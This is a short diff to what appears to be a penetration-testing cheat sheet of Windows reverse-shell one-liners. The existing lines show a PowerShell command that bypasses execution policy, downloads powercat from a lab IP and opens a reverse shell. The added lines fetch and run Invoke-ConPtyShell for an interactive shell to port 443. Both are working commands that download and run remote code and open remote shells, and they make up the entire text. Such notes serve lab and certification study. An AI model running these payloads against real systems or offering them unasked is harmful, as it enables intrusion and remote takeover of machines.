@@ -3494,3 +3494,8 @@ Powershell one liner with powercat
 ```
 powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.184/powercat.ps1');powercat -c 192.168.45.184 -p 443 -e powershell"
 ```
+
+ConPty shell windows command
+```
+IEX(IWR http://192.168.45.184/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 443
+```
